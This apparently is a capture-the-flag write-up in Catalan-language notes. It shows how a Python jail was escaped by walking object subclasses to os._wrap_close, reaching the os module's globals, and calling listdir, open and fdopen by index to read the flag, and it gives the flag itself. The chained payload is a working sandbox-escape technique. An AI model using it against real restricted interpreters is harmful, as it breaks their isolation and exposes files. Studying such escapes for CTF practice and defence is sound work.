@@ -1,0 +1,540 @@
+
+().__class__.__base__.__subclasses__()
+
+<class 'type'>,
+<class 'weakref'>,
+<class 'weakcallableproxy'>
+<class 'weakproxy'>,
+<class 'int'>
+<class 'bytearray'>
+<class 'bytes'>
+<class 'list'>
+<class 'NoneType'>
+<class 'NotImplementedType'>
+<class 'traceback'>
+<class 'super'>
+<class 'range'>
+<class 'dict'>
+<class 'dict_keys'>
+<class 'dict_values'>
+<class 'dict_items'>
+<class 'dict_reversekeyiterator'>
+<class 'dict_reversevalueiterator'>
+<class 'dict_reverseitemiterator'>
+<class 'odict_iterator'>
+<class 'set'>
+<class 'str'>
+<class 'slice'>
+<class 'staticmethod'>
+<class 'complex'>
+<class 'float'>
+<class 'frozenset'>
+<class 'property'>
+<class 'managedbuffer'>
+<class 'memoryview'>
+<class 'tuple'>
+<class 'enumerate'>
+<class 'reversed'>
+<class 'stderrprinter'>
+<class 'code'>
+<class 'frame'>
+<class 'builtin_function_or_method'>
+<class 'method'>
+<class 'function'>
+<class 'mappingproxy'>
+<class 'generator'>
+<class 'getset_descriptor'>
+<class 'wrapper_descriptor'>
+<class 'method-wrapper'>
+<class 'ellipsis'>
+<class 'member_descriptor'>
+<class 'types.SimpleNamespace'>
+<class 'PyCapsule'>
+<class 'longrange_iterator'>
+<class 'cell'>
+<class 'instancemethod'>
+<class 'classmethod_descriptor'>
+<class 'method_descriptor'>
+<class 'callable_iterator'>
+<class 'iterator'>
+<class 'pickle.PickleBuffer'>
+<class 'coroutine'>
+<class 'coroutine_wrapper'>
+<class 'InterpreterID'>
+<class 'EncodingMap'>
+<class 'fieldnameiterator'>
+<class 'formatteriterator'>
+<class 'BaseException'>
+<class 'hamt'>
+<class 'hamt_array_node'>
+<class 'hamt_bitmap_node'>
+<class 'hamt_collision_node'>
+<class 'keys'>
+<class 'values'>
+<class 'items'>
+<class 'Context'>
+<class 'ContextVar'>
+<class 'Token'>
+<class 'Token.MISSING'>
+<class 'moduledef'>
+<class 'module'>
+<class 'filter'>
+<class 'map'>
+<class 'zip'>
+<class '_frozen_importlib._ModuleLock'>
+<class '_frozen_importlib._DummyModuleLock'>
+<class '_frozen_importlib._ModuleLockManager'>
+<class '_frozen_importlib.ModuleSpec'>
+<class '_frozen_importlib.BuiltinImporter'>
+<class 'classmethod'>
+<class '_frozen_importlib.FrozenImporter'>
+<class '_frozen_importlib._ImportLockContext'>
+<class '_thread._localdummy'>
+<class '_thread._local'>
+<class '_thread.lock'>
+<class '_thread.RLock'>
+<class '_frozen_importlib_external.WindowsRegistryFinder'>
+<class '_frozen_importlib_external._LoaderBasics'>
+<class '_frozen_importlib_external.FileLoader'>
+<class '_frozen_importlib_external._NamespacePath'>
+<class '_frozen_importlib_external._NamespaceLoader'>
+<class '_frozen_importlib_external.PathFinder'>
+<class '_frozen_importlib_external.FileFinder'>
+<class '_io._IOBase'>
+<class '_io._BytesIOBuffer'>
+<class '_io.IncrementalNewlineDecoder'>
+<class 'posix.ScandirIterator'>
+<class 'posix.DirEntry'>
+<class 'zipimport.zipimporter'>
+<class 'zipimport._ZipImportResourceReader'>
+<class 'codecs.Codec'>
+<class 'codecs.IncrementalEncoder'>
+<class 'codecs.IncrementalDecoder'>
+<class 'codecs.StreamReaderWriter'>
+<class 'codecs.StreamRecoder'>
+<class '_abc_data'>
+<class 'abc.ABC'>
+<class 'dict_itemiterator'>
+<class 'collections.abc.Hashable'>
+<class 'collections.abc.Awaitable'>
+<class 'collections.abc.AsyncIterable'>
+<class 'async_generator'>
+<class 'collections.abc.Iterable'>
+<class 'bytes_iterator'>
+<class 'bytearray_iterator'>
+<class 'dict_keyiterator'>
+<class 'dict_valueiterator'>
+<class 'list_iterator'>
+<class 'list_reverseiterator'>
+<class 'range_iterator'>
+<class 'set_iterator'>
+<class 'str_iterator'>
+<class 'tuple_iterator'>
+<class 'collections.abc.Sized'>
+<class 'collections.abc.Container'>
+<class 'collections.abc.Callable'>
+<class 'os._wrap_close'>
+<class '_sitebuiltins.Quitter'>
+<class '_sitebuiltins._Printer'>
+<class '_sitebuiltins._Helper'>
+
+
+os._wrap_close es del modul os, cridant a __init__ i mirant 
+les globals del modul tenim access a totes les functions
+
+().__class__.__base__.__subclasses__()[-4].__init__.__globals__
+
+
+better ja que no podem posar strings:
+().__class__.__base__.__subclasses__()[-4].__init__.__globals__.keys()
+
+
+print(().__class__.__base__.__subclasses__()[-4].__init__.__globals__.keys())
+
+dict_keys([
+'__name__'
+'__doc__'
+'__package__'
+'__loader__'
+'__spec__'
+'__file__'
+'__cached__'
+'__builtins__'
+'abc'
+'sys'
+'st'
+'_check_methods'
+'__all__'
+'_exists'
+'_get_exports_list'
+'name'
+'linesep'
+'stat'
+'access'
+'ttyname'
+'chdir'
+'chmod'
+'fchmod'
+'chown'
+'fchown'
+'lchown'
+'chroot'
+'ctermid'
+'getcwd'
+'getcwdb'
+'link'
+'listdir' # 31
+'lstat'
+'mkdir'
+'nice'
+'getpriority'
+'setpriority'
+'posix_spawn'
+'posix_spawnp'
+'readlink'
+'copy_file_range'
+'rename'
+'replace'
+'rmdir'
+'symlink'
+'system'
+'umask'
+'uname'
+'unlink'
+'remove'
+'utime'
+'times'
+'execv'
+'execve'
+'fork'
+'register_at_fork'
+'sched_get_priority_max'
+'sched_get_priority_min'
+'sched_getparam'
+'sched_getscheduler'
+'sched_rr_get_interval'
+'sched_setparam'
+'sched_setscheduler'
+'sched_yield'
+'sched_setaffinity'
+'sched_getaffinity'
+'openpty'
+'forkpty'
+'getegid'
+'geteuid'
+'getgid'
+'getgrouplist'
+'getgroups'
+'getpid'
+'getpgrp'
+'getppid'
+'getuid'
+'getlogin'
+'kill'
+'killpg'
+'setuid'
+'seteuid'
+'setreuid'
+'setgid'
+'setegid'
+'setregid'
+'setgroups'
+'initgroups'
+'getpgid'
+'setpgrp'
+'wait'
+'wait3'
+'wait4'
+'waitid'
+'waitpid'
+'getsid'
+'setsid'
+'setpgid'
+'tcgetpgrp'
+'tcsetpgrp'
+'open' #100
+'close'
+'closerange'
+'device_encoding'
+'dup'
+'dup2'
+'lockf'
+'lseek'
+'read' #108
+'readv'
+'pread'
+'preadv'
+'write'
+'writev'
+'pwrite'
+'pwritev'
+'sendfile'
+'fstat'
+'isatty'
+'pipe'
+'pipe2'
+'mkfifo'
+'mknod'
+'major'
+'minor'
+'makedev'
+'ftruncate'
+'truncate'
+'posix_fallocate'
+'posix_fadvise'
+'putenv'
+'unsetenv'
+'strerror'
+'fchdir'
+'fsync'
+'sync'
+'fdatasync'
+'WCOREDUMP'
+'WIFCONTINUED'
+'WIFSTOPPED'
+'WIFSIGNALED'
+'WIFEXITED'
+'WEXITSTATUS'
+'WTERMSIG'
+'WSTOPSIG'
+'fstatvfs'
+'statvfs'
+'confstr'
+'sysconf'
+'fpathconf'
+'pathconf'
+'abort'
+'getloadavg'
+'urandom'
+'setresuid'
+'setresgid'
+'getresuid'
+'getresgid'
+'get_terminal_size'
+'cpu_count'
+'get_inheritable'
+'set_inheritable'
+'get_blocking'
+'set_blocking'
+'scandir'
+'fspath'
+'getrandom'
+'memfd_create'
+'environ'
+'F_OK'
+'R_OK'
+'W_OK'
+'X_OK'
+'NGROUPS_MAX'
+'TMP_MAX'
+'WCONTINUED'
+'WNOHANG'
+'WUNTRACED'
+'O_RDONLY'
+'O_WRONLY'
+'O_RDWR'
+'O_NDELAY'
+'O_NONBLOCK'
+'O_APPEND'
+'O_DSYNC'
+'O_RSYNC'
+'O_SYNC'
+'O_NOCTTY'
+'O_CREAT'
+'O_EXCL'
+'O_TRUNC'
+'O_LARGEFILE'
+'O_EXEC'
+'O_SEARCH'
+'O_PATH'
+'O_TTY_INIT'
+'O_TMPFILE'
+'PRIO_PROCESS'
+'PRIO_PGRP'
+'PRIO_USER'
+'O_CLOEXEC'
+'O_ACCMODE'
+'O_ASYNC'
+'O_DIRECT'
+'O_DIRECTORY'
+'O_NOFOLLOW'
+'O_NOATIME'
+'EX_OK'
+'EX_USAGE'
+'EX_DATAERR'
+'EX_NOINPUT'
+'EX_NOUSER'
+'EX_NOHOST'
+'EX_UNAVAILABLE'
+'EX_SOFTWARE'
+'EX_OSERR'
+'EX_OSFILE'
+'EX_CANTCREAT'
+'EX_IOERR'
+'EX_TEMPFAIL'
+'EX_PROTOCOL'
+'EX_NOPERM'
+'EX_CONFIG'
+'ST_RDONLY'
+'ST_NOSUID'
+'ST_NODEV'
+'ST_NOEXEC'
+'ST_SYNCHRONOUS'
+'ST_MANDLOCK'
+'ST_WRITE'
+'ST_APPEND'
+'ST_NOATIME'
+'ST_NODIRATIME'
+'ST_RELATIME'
+'POSIX_FADV_NORMAL'
+'POSIX_FADV_SEQUENTIAL'
+'POSIX_FADV_RANDOM'
+'POSIX_FADV_NOREUSE'
+'POSIX_FADV_WILLNEED'
+'POSIX_FADV_DONTNEED'
+'P_PID'
+'P_PGID'
+'P_ALL'
+'WEXITED'
+'WNOWAIT'
+'WSTOPPED'
+'CLD_EXITED'
+'CLD_DUMPED'
+'CLD_TRAPPED'
+'CLD_CONTINUED'
+'F_LOCK'
+'F_TLOCK'
+'F_ULOCK'
+'F_TEST'
+'POSIX_SPAWN_OPEN'
+'POSIX_SPAWN_CLOSE'
+'POSIX_SPAWN_DUP2'
+'SCHED_OTHER'
+'SCHED_FIFO'
+'SCHED_RR'
+'SCHED_BATCH'
+'SCHED_IDLE'
+'SCHED_RESET_ON_FORK'
+'RTLD_LAZY'
+'RTLD_NOW'
+'RTLD_GLOBAL'
+'RTLD_LOCAL'
+'RTLD_NODELETE'
+'RTLD_NOLOAD'
+'GRND_RANDOM'
+'GRND_NONBLOCK'
+'MFD_CLOEXEC'
+'MFD_ALLOW_SEALING'
+'MFD_HUGETLB'
+'MFD_HUGE_SHIFT'
+'MFD_HUGE_MASK'
+'MFD_HUGE_64KB'
+'MFD_HUGE_512KB'
+'MFD_HUGE_1MB'
+'MFD_HUGE_2MB'
+'MFD_HUGE_8MB'
+'MFD_HUGE_16MB'
+'MFD_HUGE_32MB'
+'MFD_HUGE_256MB'
+'MFD_HUGE_512MB'
+'MFD_HUGE_1GB'
+'MFD_HUGE_2GB'
+'MFD_HUGE_16GB'
+'pathconf_names'
+'confstr_names'
+'sysconf_names'
+'error'
+'waitid_result'
+'stat_result'
+'statvfs_result'
+'sched_param'
+'times_result'
+'uname_result'
+'terminal_size'
+'DirEntry'
+'_exit'
+'path'
+'curdir'
+'pardir'
+'sep'
+'pathsep'
+'defpath'
+'extsep'
+'altsep'
+'devnull'
+'supports_dir_fd'
+'supports_effective_ids'
+'supports_fd'
+'supports_follow_symlinks'
+'SEEK_SET'
+'SEEK_CUR'
+'SEEK_END'
+'makedirs'
+'removedirs'
+'renames'
+'walk'
+'fwalk'
+'_fwalk'
+'execl'
+'execle'
+'execlp'
+'execlpe'
+'execvp'
+'execvpe'
+'_execvpe'
+'get_exec_path'
+'MutableMapping'
+'_Environ'
+'_putenv'
+'_unsetenv'
+'getenv'
+'supports_bytes_environ'
+'environb'
+'getenvb'
+'fsencode'
+'fsdecode'
+'P_WAIT'
+'P_NOWAIT'
+'P_NOWAITO'
+'_spawnvef'
+'spawnv'
+'spawnve'
+'spawnvp'
+'spawnvpe'
+'spawnl'
+'spawnle'
+'spawnlp'
+'spawnlpe'
+'popen'
+'_wrap_close'
+'fdopen'
+'_fspath'
+'PathLike'])
+
+tenim 'listdir'. No es suscribable, hem de transformar a list primer.
+Per accedir a les dues coses cridarem dir.items()
+
+().__class__.__base__.__subclasses__()[-4].__init__.__globals__.items()
+
+No podem fer un list()... [].__class__()
+
+print([].__class__(().__class__.__base__.__subclasses__()[-4].__init__.__globals__.items())[31])
+
+
+
+Tenim l'string!
+
+print([].__class__(().__class__.__base__.__subclasses__()[-4].__init__.__globals__.items())[31][1]()[0])
+
+ara l'hem de printar amb 
+
+d = [].__class__(().__class__.__base__.__subclasses__()[-4].__init__.__globals__.items()); p = d[31][1]()[0]; o = d[100][1]; f = d[355][1]; print(f(o(p,0)).read())
+
+
+listdir     31
+open        100
+    o.R_DONLY = 0
+fdopen      355 
+
+# CHTB{n0_j4il_c4n_h4ndl3_m3!}
+
